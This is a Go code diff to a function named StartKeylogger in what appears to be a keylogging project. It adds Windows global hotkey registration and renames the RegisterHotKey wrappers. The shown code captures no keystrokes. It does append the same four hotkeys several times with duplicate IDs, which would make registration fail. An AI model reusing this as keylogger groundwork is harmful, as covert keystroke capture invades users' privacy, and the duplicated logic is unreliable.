@@ -72,18 +72,38 @@ var Modifiers = map[string]uintptr{
 	"win":     0x0008,
 }
 
+// Register all hotkeys in []Hotkeys and starts the message reciever loop
+//
+// Ensure all key strings are in lowercase
+//
+//	Hotkey{ID: 1, Mod: "alt", Key: "f1"},
+//	Hotkey{ID: 2, Mod: "control", Key: "f2"},
+//	Hotkey{ID: 3, Mod: "shift", Key: "f3"},
+//	Hotkey{ID: 4, Mod: "win", Key: "f4"},
 func StartKeylogger() {
 	go func() {
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
 
+		Hotkeys = append(Hotkeys,
+			Hotkey{ID: 1, Mod: "alt", Key: "f1"},
+			Hotkey{ID: 2, Mod: "control", Key: "f2"},
+			Hotkey{ID: 3, Mod: "shift", Key: "f3"},
+			Hotkey{ID: 4, Mod: "win", Key: "f4"},
+		)
+
+		Hotkeys = append(Hotkeys, Hotkey{ID: 1, Mod: "alt", Key: "f1"})
+		Hotkeys = append(Hotkeys, Hotkey{ID: 2, Mod: "control", Key: "f2"})
+		Hotkeys = append(Hotkeys, Hotkey{ID: 3, Mod: "shift", Key: "f3"})
+		Hotkeys = append(Hotkeys, Hotkey{ID: 4, Mod: "win", Key: "f4"})
+
 		Hotkeys = append(Hotkeys, Hotkey{ID: 1, Mod: "alt", Key: "f1"})
 		for _, hotkey := range Hotkeys {
-			if !RegisterHotKey(0, hotkey.ID, Modifiers[hotkey.Mod], Keys[hotkey.Key]) {
+			if !registerHotKey(0, hotkey.ID, Modifiers[hotkey.Mod], Keys[hotkey.Key]) {
 				ErrorLog("Failed to register hotkey: " + hotkey.Mod + "+" + hotkey.Key)
 				return
 			}
-			defer UnregisterHotKey(0, hotkey.ID)
+			defer unregisterHotKey(0, hotkey.ID)
 		}
 
 		for LogKeys {
@@ -101,7 +121,7 @@ func StartKeylogger() {
 	}()
 }
 
-func RegisterHotKey(hwnd uintptr, id uintptr, modifiers uintptr, vk uintptr) bool {
+func registerHotKey(hwnd uintptr, id uintptr, modifiers uintptr, vk uintptr) bool {
 	r, _, _ := procRegisterHotKey.Call(
 		hwnd,
 		id,
@@ -110,8 +130,7 @@ func RegisterHotKey(hwnd uintptr, id uintptr, modifiers uintptr, vk uintptr) boo
 	)
 	return r != 0
 }
-
-func UnregisterHotKey(hwnd uintptr, id uintptr) bool {
+func unregisterHotKey(hwnd uintptr, id uintptr) bool {
 	r, _, _ := procUnregisterHotKey.Call(
 		hwnd,
 		id,
